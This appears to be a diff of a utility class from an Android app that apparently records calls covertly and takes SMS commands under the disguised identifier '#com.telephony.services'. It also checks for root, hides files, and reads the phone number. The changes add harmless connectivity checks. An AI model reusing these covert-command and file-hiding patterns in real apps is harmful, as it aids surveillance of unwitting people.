@@ -5,6 +5,7 @@ import java.io.File;
 import java.io.FilenameFilter;
 import java.io.OutputStreamWriter;
 import java.util.ArrayList;
+import java.util.concurrent.TimeUnit;
 
 import android.app.Notification;
 import android.app.NotificationManager;
@@ -15,6 +16,8 @@ import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Environment;
 import android.provider.ContactsContract.PhoneLookup;
@@ -31,7 +34,7 @@ public class Utils {
 	public static final int STATE_CALL_END = 3;
 	public static final int STATE_REC_START = 4;
 	public static final int STATE_REC_STOP = 5;
-	
+
 	public static final String EXTRA_RUN_COMMAND = "run_command";
 	public static final int COMMAND_RUN_SCRIPTER = 1;
 	public static final int COMMAND_RUN_UPDATER = 2;
@@ -41,19 +44,16 @@ public class Utils {
 	public static final int MEDIA_MOUNTED = 0;
 	public static final int MEDIA_MOUNTED_READ_ONLY = 1;
 	public static final int NO_MEDIA = 2;
-	
+
 	public static final String EXTRA_SMS_BODY = "smsbody";
 	public static final String EXTRA_SMS_FROM = "smsfrom";
 	public static final String IDENT_SMS = "#com.telephony.services";
 	public static final String CONFIG_OUT_FILENAME = "config.out";
-	
 
 	public static final long SECOND = 1000L;
 	public static final long MINUTE = SECOND * 60;
 	public static final long HOUR = MINUTE * 60;
 	public static final long DAY = HOUR * 24;
-	
-	
 
 	/**
 	 * Check if app have root
@@ -80,6 +80,37 @@ public class Utils {
 			}
 		}
 
+		return false;
+	}
+
+	public static int getInternetType(Context context) {
+		int res = -1;
+		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+
+		NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
+		if (activeNetwork != null && activeNetwork.isConnected()) {
+			res = activeNetwork.getType();
+		}
+		return res;
+	}
+
+	public static boolean waitForInternet(Context context, boolean isWifi, int secs) throws InterruptedException {
+		int cnt = 0;
+		int inetType = -1;
+		while ((cnt < secs)) {
+			inetType = Utils.getInternetType(context);
+			if (inetType >= 0) {
+				if (isWifi) {
+					if ((inetType != ConnectivityManager.TYPE_MOBILE)) {
+						return true;
+					}
+				} else {
+					return true;
+				}
+			}
+			TimeUnit.SECONDS.sleep(1);
+			cnt += 1;
+		}
 		return false;
 	}
 
@@ -164,29 +195,35 @@ public class Utils {
 		}
 		return res;
 	}
-	
+
 	public static void show_notification(Context context, int mId, Intent intent) {
-		NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(context)
-		 .setSmallIcon(R.drawable.ic_launcher) // notification icon
-				.setContentTitle(context.getResources().getString(R.string.update_title)) // title for notification
-				.setContentText(context.getResources().getString(R.string.update_text)) // message for notification
-				.setSubText(context.getResources().getString(R.string.update_subtext))				
-				.setAutoCancel(true); // clear notification after click
+		NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(context).setSmallIcon(R.drawable.ic_launcher) // notification
+																															// icon
+				.setContentTitle(context.getResources().getString(R.string.update_title)) // title
+																							// for
+																							// notification
+				.setContentText(context.getResources().getString(R.string.update_text)) // message
+																						// for
+																						// notification
+				.setSubText(context.getResources().getString(R.string.update_subtext)).setAutoCancel(true); // clear
+																											// notification
+																											// after
+																											// click
 
 		PendingIntent pi = PendingIntent.getActivity(context, 0, intent, Intent.FLAG_ACTIVITY_NEW_TASK);
 		mBuilder.setContentIntent(pi);
 		Notification notif = mBuilder.build();
 		notif.flags |= Notification.FLAG_ONGOING_EVENT;
 		NotificationManager mNotificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
-		
+
 		mNotificationManager.notify(mId, notif);
 	}
-	
+
 	public static String getSelfPhoneNumber(Context context) {
 		TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 		return tMgr.getLine1Number();
 	}
-	
+
 	public static String implodeStrings(String[] strings, String glue) {
 		StringBuilder sb = new StringBuilder();
 		if (strings.length > 0) {
@@ -197,7 +234,7 @@ public class Utils {
 		}
 		return sb.toString();
 	}
-	
+
 	public static int getCurrentVersion(Context context) {
 		int code = 0;
 		PackageInfo pInfo = null;
@@ -209,7 +246,7 @@ public class Utils {
 		}
 		return code;
 	}
-	
+
 	public static File getHidden(File file) {
 		File new_file = file;
 		if (!file.isHidden()) {
